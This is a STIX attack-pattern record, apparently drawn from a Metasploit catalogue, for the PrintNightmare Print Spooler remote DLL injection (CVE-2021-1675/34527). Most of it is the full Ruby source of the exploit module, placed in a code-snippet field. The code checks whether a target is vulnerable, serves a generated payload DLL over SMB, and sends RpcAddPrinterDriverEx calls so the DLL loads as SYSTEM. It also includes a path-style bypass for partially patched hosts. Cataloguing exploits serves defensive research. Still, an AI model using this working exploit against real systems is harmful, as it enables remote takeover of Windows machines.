{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e5c458b6-3e87-4763-9f8d-8d9091d3fdfd",
    "created": "2024-08-14T16:39:38.904825Z",
    "modified": "2024-08-14T16:39:38.904829Z",
    "name": "Print Spooler Remote DLL Injection",
    "description": " The print spooler service can be abused by an authenticated remote attacker to load a DLL through a crafted DCERPC request, resulting in remote code execution as NT AUTHORITY\\SYSTEM. This module uses the MS-RPRN vector which requires the Print Spooler service to be running. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/dcerpc/cve_2021_1675_printnightmare.rb",
            "external_id": "cve_2021_1675_printnightmare.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-1675"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-34527"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/cube0x0/CVE-2021-1675"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20210701042336/https://github.com/afwu/PrintNightmare"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/byt3bl33d3r/ItWasAllADream"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'windows_error'\nrequire 'ruby_smb'\nrequire 'ruby_smb/error'\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Exploit::Remote::SMB::Server::Share\n  include Msf::Exploit::Retry\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Deprecated\n\n  moved_from 'auxiliary/admin/dcerpc/cve_2021_1675_printnightmare'\n\n  PrintSystem = RubySMB::Dcerpc::PrintSystem\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Print Spooler Remote DLL Injection',\n        'Description' => %q{\n          The print spooler service can be abused by an authenticated remote attacker to load a DLL through a crafted\n          DCERPC request, resulting in remote code execution as NT AUTHORITY\\SYSTEM. This module uses the MS-RPRN\n          vector which requires the Print Spooler service to be running.\n        },\n        'Author' => [\n          'Zhiniang Peng',           # vulnerability discovery / research\n          'Xuefeng Li',              # vulnerability discovery / research\n          'Zhipeng Huo',             # vulnerability discovery\n          'Piotr Madej',             # vulnerability discovery\n          'Zhang Yunhai',            # vulnerability discovery\n          'cube0x0',                 # PoC\n          'Spencer McIntyre',        # metasploit module\n          'Christophe De La Fuente', # metasploit module co-author\n        ],\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'SRVHOST' => Rex::Socket.source_address\n        },\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Targets' => [\n          [\n            'Windows', {\n              'Platform' => 'win',\n              'Arch' => [ ARCH_X64, ARCH_X86 ]\n            },\n          ],\n        ],\n        'DisclosureDate' => '2021-06-08',\n        'References' => [\n          ['CVE', '2021-1675'],\n          ['CVE', '2021-34527'],\n          ['URL', 'https://github.com/cube0x0/CVE-2021-1675'],\n          ['URL', 'https://web.archive.org/web/20210701042336/https://github.com/afwu/PrintNightmare'],\n          ['URL', 'https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1'],\n          ['URL', 'https://github.com/byt3bl33d3r/ItWasAllADream']\n        ],\n        'Notes' => {\n          'AKA' => [ 'PrintNightmare' ],\n          'Stability' => [CRASH_SERVICE_DOWN],\n          'Reliability' => [UNRELIABLE_SESSION],\n          'SideEffects' => [\n            ARTIFACTS_ON_DISK # the dll will be copied to the remote server\n          ]\n        }\n      )\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('ReconnectTimeout', [ true, 'The timeout in seconds for reconnecting to the named pipe', 10 ])\n      ]\n    )\n    deregister_options('AutoCheck')\n  end\n\n  def check\n    begin\n      connect(backend: :ruby_smb)\n    rescue Rex::ConnectionError\n      return Exploit::CheckCode::Unknown('Failed to connect to the remote service.')\n    end\n\n    begin\n      smb_login\n    rescue Rex::Proto::SMB::Exceptions::LoginError\n      return Exploit::CheckCode::Unknown('Failed to authenticate to the remote service.')\n    end\n\n    begin\n      dcerpc_bind_spoolss\n    rescue RubySMB::Error::UnexpectedStatusCode => e\n      nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first\n      if nt_status == ::WindowsError::NTStatus::STATUS_OBJECT_NAME_NOT_FOUND\n        print_error(\"The 'Print Spooler' service is disabled.\")\n      end\n      return Exploit::CheckCode::Safe(\"The DCERPC bind failed with error #{nt_status.name} (#{nt_status.description}).\")\n    end\n\n    @target_arch = dcerpc_getarch\n    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/e81cbc09-ab05-4a32-ae4a-8ec57b436c43\n    if @target_arch == ARCH_X64\n      @environment = 'Windows x64'\n    elsif @target_arch == ARCH_X86\n      @environment = 'Windows NT x86'\n    else\n      return Exploit::CheckCode::Detected('Successfully bound to the remote service.')\n    end\n\n    print_status(\"Target environment: Windows v#{simple.client.os_version} (#{@target_arch})\")\n\n    print_status('Enumerating the installed printer drivers...')\n    drivers = enum_printer_drivers(@environment)\n    @driver_path = \"#{drivers.driver_path.rpartition('\\\\').first}\\\\UNIDRV.DLL\"\n    vprint_status(\"Using driver path: #{@driver_path}\")\n\n    print_status('Retrieving the path of the printer driver directory...')\n    @config_directory = get_printer_driver_directory(@environment)\n    vprint_status(\"Using driver directory: #{@config_directory}\") unless @config_directory.nil?\n\n    container = driver_container(\n      p_config_file: 'C:\\\\Windows\\\\System32\\\\kernel32.dll',\n      p_data_file: \"\\\\??\\\\UNC\\\\127.0.0.1\\\\#{Rex::Text.rand_text_alphanumeric(4..8)}\\\\#{Rex::Text.rand_text_alphanumeric(4..8)}.dll\"\n    )\n\n    case add_printer_driver_ex(container)\n    when nil # prevent the module from erroring out in case the response can't be mapped to a Win32 error code\n      return Exploit::CheckCode::Unknown('Received unknown status code, implying the target is not vulnerable.')\n    when ::WindowsError::Win32::ERROR_PATH_NOT_FOUND\n      return Exploit::CheckCode::Vulnerable('Received ERROR_PATH_NOT_FOUND, implying the target is vulnerable.')\n    when ::WindowsError::Win32::ERROR_BAD_NET_NAME\n      return Exploit::CheckCode::Vulnerable('Received ERROR_BAD_NET_NAME, implying the target is vulnerable.')\n    when ::WindowsError::Win32::ERROR_ACCESS_DENIED\n      return Exploit::CheckCode::Safe('Received ERROR_ACCESS_DENIED implying the target is patched.')\n    end\n\n    Exploit::CheckCode::Detected('Successfully bound to the remote service.')\n  end\n\n  def run\n    fail_with(Failure::BadConfig, 'Can not use an x64 payload on an x86 target.') if @target_arch == ARCH_X86 && payload.arch.first == ARCH_X64\n    fail_with(Failure::NoTarget, 'Only x86 and x64 targets are supported.') if @environment.nil?\n    fail_with(Failure::Unknown, 'Failed to enumerate the driver directory.') if @config_directory.nil?\n\n    super\n  end\n\n  def setup\n    if Rex::Socket.is_ip_addr?(datastore['SRVHOST']) && Rex::Socket.addr_atoi(datastore['SRVHOST']) == 0\n      fail_with(Exploit::Failure::BadConfig, 'The SRVHOST option must be set to a routable IP address.')\n    end\n\n    super\n  end\n\n  def start_service\n    file_name << '.dll'\n    self.file_contents = generate_payload_dll\n\n    super\n  end\n\n  def primer\n    dll_path = unc\n    if dll_path =~ /^\\\\\\\\([\\w:.\\[\\]]+)\\\\(.*)$/\n      # targets patched for CVE-2021-34527 (but with Point and Print enabled) need to use this path style as a bypass\n      # otherwise the operation will fail with ERROR_INVALID_PARAMETER\n      dll_path = \"\\\\??\\\\UNC\\\\#{Regexp.last_match(1)}\\\\#{Regexp.last_match(2)}\"\n    end\n    vprint_status(\"Using DLL path: #{dll_path}\")\n\n    filename = dll_path.rpartition('\\\\').last\n    container = driver_container(p_config_file: 'C:\\\\Windows\\\\System32\\\\kernel32.dll', p_data_file: dll_path)\n\n    3.times do\n      add_printer_driver_ex(container)\n    end\n\n    1.upto(3) do |directory|\n      container.driver_info.p_config_file.assign(\"#{@config_directory}\\\\3\\\\old\\\\#{directory}\\\\#{filename}\")\n      break if add_printer_driver_ex(container).nil?\n    end\n\n    cleanup_service\n  end\n\n  def driver_container(**kwargs)\n    PrintSystem::DriverContainer.new(\n      level: 2,\n      tag: 2,\n      driver_info: PrintSystem::DriverInfo2.new(\n        c_version: 3,\n        p_name_ref_id: 0x00020000,\n        p_environment_ref_id: 0x00020004,\n        p_driver_path_ref_id: 0x00020008,\n        p_data_file_ref_id: 0x0002000c,\n        p_config_file_ref_id: 0x00020010,\n        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913\n        p_name: \"#{Rex::Text.rand_text_alpha_upper(2..4)} #{Rex::Text.rand_text_numeric(2..3)}\",\n        p_environment: @environment,\n        p_driver_path: @driver_path,\n        **kwargs\n      )\n    )\n  end\n\n  def dcerpc_bind_spoolss\n    handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\\\spoolss'])\n    vprint_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    vprint_status(\"Bound to #{handle} ...\")\n  end\n\n  def enum_printer_drivers(environment)\n    response = rprn_call('RpcEnumPrinterDrivers', p_environment: environment, level: 2)\n    response = rprn_call('RpcEnumPrinterDrivers', p_environment: environment, level: 2, p_drivers: [0] * response.pcb_needed, cb_buf: response.pcb_needed)\n    fail_with(Failure::UnexpectedReply, 'Failed to enumerate printer drivers.') unless response.p_drivers&.length\n    DriverInfo2.read(response.p_drivers.map(&:chr).join)\n  end\n\n  def get_printer_driver_directory(environment)\n    response = rprn_call('RpcGetPrinterDriverDirectory', p_environment: environment, level: 2)\n    response = rprn_call('RpcGetPrinterDriverDirectory', p_environment: environment, level: 2, p_driver_directory: [0] * response.pcb_needed, cb_buf: response.pcb_needed)\n    fail_with(Failure::UnexpectedReply, 'Failed to obtain the printer driver directory.') unless response.p_driver_directory&.length\n    RubySMB::Field::Stringz16.read(response.p_driver_directory.map(&:chr).join).encode('ASCII-8BIT')\n  end\n\n  def add_printer_driver_ex(container)\n    flags = PrintSystem::APD_INSTALL_WARNED_DRIVER | PrintSystem::APD_COPY_FROM_DIRECTORY | PrintSystem::APD_COPY_ALL_FILES\n\n    begin\n      response = rprn_call('RpcAddPrinterDriverEx', p_name: \"\\\\\\\\#{datastore['RHOST']}\", p_driver_container: container, dw_file_copy_flags: flags)\n    rescue RubySMB::Error::UnexpectedStatusCode => e\n      nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first\n      message = \"Error #{nt_status.name} (#{nt_status.description})\"\n      if nt_status == ::WindowsError::NTStatus::STATUS_PIPE_BROKEN\n        # STATUS_PIPE_BROKEN is the return value when the payload is executed, so this is somewhat expected\n        print_status('The named pipe connection was broken, reconnecting...')\n        reconnected = retry_until_truthy(timeout: datastore['ReconnectTimeout'].to_i) do\n          dcerpc_bind_spoolss\n        rescue RubySMB::Error::CommunicationError, RubySMB::Error::UnexpectedStatusCode => e\n          false\n        else\n          true\n        end\n\n        unless reconnected\n          vprint_status('Failed to reconnect to the named pipe.')\n          return nil\n        end\n\n        print_status('Successfully reconnected to the named pipe.')\n        retry\n      else\n        print_error(message)\n      end\n\n      return nt_status\n    end\n\n    error = ::WindowsError::Win32.find_by_retval(response.error_status.value).first\n    message = \"RpcAddPrinterDriverEx response #{response.error_status}\"\n    message << \" #{error.name} (#{error.description})\" unless error.nil?\n    vprint_status(message)\n    error\n  end\n\n  def rprn_call(name, **kwargs)\n    request = PrintSystem.const_get(\"#{name}Request\").new(**kwargs)\n\n    begin\n      raw_response = dcerpc.call(request.opnum, request.to_binary_s)\n    rescue Rex::Proto::DCERPC::Exceptions::Fault => e\n      fail_with(Failure::UnexpectedReply, \"The #{name} Print System RPC request failed (#{e.message}).\")\n    end\n\n    PrintSystem.const_get(\"#{name}Response\").read(raw_response)\n  end\n\n  class DriverInfo2Header < BinData::Record\n    endian :little\n\n    uint32     :c_version\n    uint32     :name_offset\n    uint32     :environment_offset\n    uint32     :driver_path_offset\n    uint32     :data_file_offset\n    uint32     :config_file_offset\n  end\n\n  # this is a partial implementation that just parses the data, this is *not* the same struct as PrintSystem::DriverInfo2\n  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030\n  DriverInfo2 = Struct.new(:header, :name, :environment, :driver_path, :data_file, :config_file) do\n    def self.read(data)\n      header = DriverInfo2Header.read(data)\n      new(\n        header,\n        RubySMB::Field::Stringz16.read(data[header.name_offset..]).encode('ASCII-8BIT'),\n        RubySMB::Field::Stringz16.read(data[header.environment_offset..]).encode('ASCII-8BIT'),\n        RubySMB::Field::Stringz16.read(data[header.driver_path_offset..]).encode('ASCII-8BIT'),\n        RubySMB::Field::Stringz16.read(data[header.data_file_offset..]).encode('ASCII-8BIT'),\n        RubySMB::Field::Stringz16.read(data[header.config_file_offset..]).encode('ASCII-8BIT')\n      )\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-06-08",
    "x_mitre_platforms": [
        "win'"
    ]
}